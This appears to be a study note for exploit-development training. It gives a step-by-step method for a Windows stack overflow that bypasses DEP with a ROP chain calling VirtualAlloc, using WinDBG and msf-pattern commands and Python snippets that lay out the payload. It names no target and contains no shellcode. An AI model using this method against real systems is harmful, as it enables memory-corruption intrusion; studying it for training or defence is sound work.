# Stack Layout When Crashing
```
 _____________________________ 
|  A * (offset-len(va))       |    Lower Address
|_____________________________|    ↑
|  VirtualAllocStub Address   |    ↑
|_____________________________|    ↑
|  Return Address             |    ↑
|_____________________________|    ↑
|  lpBuffer argument          |    ↑
|_____________________________|    ↑
|  dwSize argument            |    ↑
|_____________________________|    ↑
|  flAllocationType argument  |    ↑
|_____________________________|    ↑
|  flProtect argument         |    ↑
|_____________________________|    ↓
|  Written EIP                |    ↓    
|  Gadget saves initial ESP   |    ↓    
|_____________________________|    ↓
|  B * gap (gap can be 0)     |    ↓ 
|_____________________________|    ↓
|  Start of ROP Chain         |    ↓
|  Initial ESP                |    ↓
|_____________________________|    ↓
|  ROP Chain ...              |    ↓ 
|_____________________________|    ↓ 
|  Start of shellcode         |    ↓ 
|_____________________________|    Higher Address

```

# Steps
## Crash the application
Find the length of payload that is sufficient to crash the application

## Find the offset to overwrite EIP
Find the offset that can overwrite EIP
```bash
//Bash
msf-pattern_create -l <length>
msf-pattern_offset -l <length> -q <EIP>
```

## Find the offset from return address to ESP
When the application crashes, find the distance between the return address and ESP. Sometimes it is 0, sometimes it is not.
```windbg
//WinDBG
dd esp + <offset>
```

```bash
//Bash
msf-pattern_offset -l <length> -q <First DWORD of payload>
```
Pad the gap, and align valid payload with ESP.

## Find bad characters
Replace the actual payload with characters from 0x01 to 0xff. Find all the bad characters.

```python
# Python
  badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

The payload is ```A * length + B * gap + \x01\x02\x03\...\xff```

## Select a gadget that saves the initial ESP when crashing
Note the base address of an unprotected module
```windbg
//WinDBG
.load narly
!nmod
lm m <module>
```


Eliminate all bad characters, and run rp.exe or the script to collect gadgets.

Firstly, select a gadget that saves the initial ESP when crashing.

Some typical forms:

- push ESP, pop ANY
- push ESP, other instructions, pop ANY
- mov ANY, esp
- lea ANY, esp/[esp]
- lea ANY, [esp+offset]
- (When register1 meets specific requirements) add/sub/mul/or/xor ANY, esp 

## Overwrite EIP with the gadget that saves the initial ESP
Overwrite EIP with the gadget that saves the initial ESP, the initial ESP points to the start of ROP chain.

```python
# python
  eip = pack("<L", (0x10154112))
  padding = b"B"*<gap>
```

## Construct placeholder arguments required for calling VA

```python
  va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address or function IAT entry
  va += pack("<L", (0x46464646)) # Shellcode Return Address
  va += pack("<L", (0x47474747)) # dummy lpBuffer 
  va += pack("<L", (0xffffffff)) # dummy dwSize = 0x1 (-0x1)
  va += pack("<L", (0xfffff001)) # dummy flAllocationType = 0x1000 (-0xfff)
  va += pack("<L", (0xffffffc0)) # dummy flProtect = 0x40 (-0x40)
```

VA address can be a dummy address(Depending on usable gadgets), or function IAT entry

Shellcode return address and lpBuffer store placeholder values

dwSize is set 0xffffffff. Neg to recover the original value.

flAllocationType is set 0xfffff001. Neg and inc to recover the original value.

flProtect is set 0xffffffc0. Neg to recover the original value,

## Fetch IAT and address
If VA is imported into the module, fetch the IAT

If VA is not imported, find any function in KERNEL32, and calculate the offset between the 2 functions.

```windbg
\\WinDBG
x kernel32!<Function Imported>
x kernel32!VirtualAllocStub
? <Address of VirtualAllocStub> - <Address of Function Imported>
```

## Patch VA address argument
The initial ESP points to the start of the ROP chain, it is 0x1c+gap bytes away from VA address argument on the stack

## Patch return address
Inc by 4 times, or increase the address by 4 to reach return address argument. Since we have not finished the ROP chain, so reserve a sufficient length for it. For instance, 0x210 bytes.

So, the shellcode is 0x210 bytes away from the return address argument.
## Patch lpBuffer argument
The process is very similiar to patching return address, but the offset is 4 bytes less.

## Patch dwSize
Increase the address by 4 bytes, fetch and neg the value of dwSize argument.

## Patch flAllocationType
Increase the address by 4 bytes, fetch, neg, and inc the value of flAllocationType argument.

## Patch flProtect
Increase the address by 4 bytes, fetch and neg the value of flProtect argument.

## Align ESP with VA address
Now we are at flProtect argument, sub 0x18 (0x14+4) bytes to reach VA address argument

## Calculate the offset between the placeholder shellcode address and actual shellcode address
```windbg
\\WinDBG
dd <Return address argument> l1 (Before calling VA)
dd <Value of return address> + <offset>
```
